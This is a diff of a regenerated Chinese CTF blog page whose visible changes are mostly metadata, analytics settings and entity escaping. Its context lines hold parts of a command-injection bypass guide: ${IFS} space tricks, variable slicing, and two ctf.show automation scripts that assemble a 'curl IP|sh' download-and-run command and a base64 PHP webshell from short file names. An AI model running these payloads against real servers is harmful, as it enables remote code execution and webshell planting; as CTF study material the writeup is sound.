@@ -21,7 +21,7 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="dr0n">
-  <meta name="keywords" content="">
+  <meta name="keywords" content="ctf, writeups, web, misc">
   
     <meta name="description" content="部分题目环境&amp;脚本&amp;姿势来自https:&#x2F;&#x2F;ctf.show&#x2F; 命令执行函数主要有6种函数可以执行系统命令，分别是system,passthru,exec,shell_exec,popen,pcntl_exec 参数值可控12$a&#x3D;$_POST[&#x27;a&#x27;];system(&quot;ls &quot;.$a);  直接用;将命令分割成两部分执行 或者用&amp;&amp;">
 <meta property="og:type" content="article">
@@ -48,8 +48,8 @@
 <meta property="article:published_time" content="2023-01-10T03:00:00.000Z">
 <meta property="article:modified_time" content="2024-07-13T04:32:57.453Z">
 <meta property="article:author" content="dr0n">
-<meta property="article:tag" content="总结">
 <meta property="article:tag" content="rce">
+<meta property="article:tag" content="总结">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://www.dr0n.top/img/summary/rce-1.png">
   
@@ -93,7 +93,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9,"expand_all":true},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"openkounter":{"server_url":"https://openkounter-1lbvmren.edgeone.cool/","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -127,13 +127,11 @@
   
 
   
-    
-  
 
 
 
   
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -312,20 +310,13 @@
         
         
         
-          35 分钟
+          39 分钟
         
       </span>
     
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
       
     
   </div>
@@ -381,12 +372,12 @@
 <p>或者正则，<code>[^a]代表不是a的其他字符</code></p>
 <p><code>more [^a][^a][^m][^b]</code></p>
 <h2 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h2><p>符号过滤也非常常见</p>
-<p>比如可以用<code>&lt;&gt;</code>,<code>$&#123;IFS&#125;</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>等代替空格</p>
+<p>比如可以用<code>&lt;&gt;</code>,<code>${IFS}</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>等代替空格</p>
 <p>再者，可以利用变量来截取</p>
 <p>比如通过<code>env</code>命令获取到了如下变量</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi<br>USER=www-data<br>HOSTNAME=f3f5c6c3e3ee<br>PHP_INI_DIR=/usr/local/etc/php<br>SHLVL=2<br>HOME=/home/www-data<br>PHP_LDFLAGS=-Wl,-O1 -pie<br>PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_MD5=<br>PHP_VERSION=7.3.22<br>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D<br>PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.asc<br>PHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xz<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>PHPIZE_DEPS=autoconf 		dpkg-dev dpkg 		file 		g++ 		gcc 		libc-dev 		make 		pkgconf 		re2c<br>PWD=/var/www/html<br>PHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5<br>FLAG=not_flag<br></code></pre></td></tr></table></figure>
 
-<p>可以通过<code>$&#123;PHPIZE_DEPS:9:1&#125;</code>或者<code>$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;</code>表示空格</p>
+<p>可以通过<code>${PHPIZE_DEPS:9:1}</code>或者<code>${PHP_EXTRA_CONFIGURE_ARGS:12:1}</code>表示空格</p>
 <h1 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>构造一个文件上传网页，强制上传，利用<code>?</code>匹配文件来rce</p>
@@ -479,8 +470,8 @@
 
 
 <h2 id="替换bash"><a href="#替换bash" class="headerlink" title="替换bash"></a>替换bash</h2><p>在之前的payload中用的是$0来代替bash，如果不能使用0就需要构造另一个变量，变量值是0</p>
-<p>linux中可以通过<code>$&#123;!?&#125;</code>和$<code>&#123;!#&#125;</code>的形式拿到bash，但是在php的system环境下没有实现</p>
-<p>不过可以定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0，然后通过<code>$&#123;!__&#125;</code>的形式拿到sh字符</p>
+<p>linux中可以通过<code>${!?}</code>和$<code>{!#}</code>的形式拿到bash，但是在php的system环境下没有实现</p>
+<p>不过可以定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0，然后通过<code>${!__}</code>的形式拿到sh字符</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__=$(())&amp;&amp;<span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;!__&#125;</span>   <span class="hljs-comment"># bash</span><br></code></pre></td></tr></table></figure>
 
 <p>而以下变量的值同样是0</p>
@@ -568,12 +559,12 @@
 <p>自动化脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:58</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-comment">#curl 335708495|sh</span><br><span class="hljs-string">&#x27;&gt;sh&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;5\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;49\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;08\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;57\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;33\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rl\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cu\\&#x27;</span>,<br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span>,<br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>
 
-<h3 id="环境无dir，可写但不出网"><a href="#环境无dir，可写但不出网" class="headerlink" title="环境无dir，可写但不出网"></a>环境无dir，可写但不出网</h3><p>因为<code>ls -t</code>命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用<code>echo xxx|base64 -d&gt;a.php</code>的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用<code>$&#123;IFS&#125;</code>代替空格，变成<code>echo$&#123;IFS&#125;xxxxxx|base64 -d&gt;a.php</code></p>
+<h3 id="环境无dir，可写但不出网"><a href="#环境无dir，可写但不出网" class="headerlink" title="环境无dir，可写但不出网"></a>环境无dir，可写但不出网</h3><p>因为<code>ls -t</code>命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用<code>echo xxx|base64 -d&gt;a.php</code>的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用<code>${IFS}</code>代替空格，变成<code>echo${IFS}xxxxxx|base64 -d&gt;a.php</code></p>
 <p>步骤与<code>4字符-环境无dir，可写</code>基本一致，只是替换了<code>curl命令</code>，变成了<code>echo ...</code></p>
 <p>自动化脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:56:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>
 
-<h2 id="长度限制总结"><a href="#长度限制总结" class="headerlink" title="长度限制总结"></a>长度限制总结</h2><p>1：当有长度限制的情况下，最少可以在<code>4</code>字符<code>无dir</code>环境下拼接出<code>ls -t</code><br>2：空格不够用时可以用<code>$&#123;IFS&#125;</code>代替，只要命令部分不出现重复的字符组合就行</p>
+<h2 id="长度限制总结"><a href="#长度限制总结" class="headerlink" title="长度限制总结"></a>长度限制总结</h2><p>1：当有长度限制的情况下，最少可以在<code>4</code>字符<code>无dir</code>环境下拼接出<code>ls -t</code><br>2：空格不够用时可以用<code>${IFS}</code>代替，只要命令部分不出现重复的字符组合就行</p>
 
                 
               </div>
@@ -838,23 +829,6 @@
   
 
   
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
 
 </div>
 
@@ -1022,8 +996,6 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
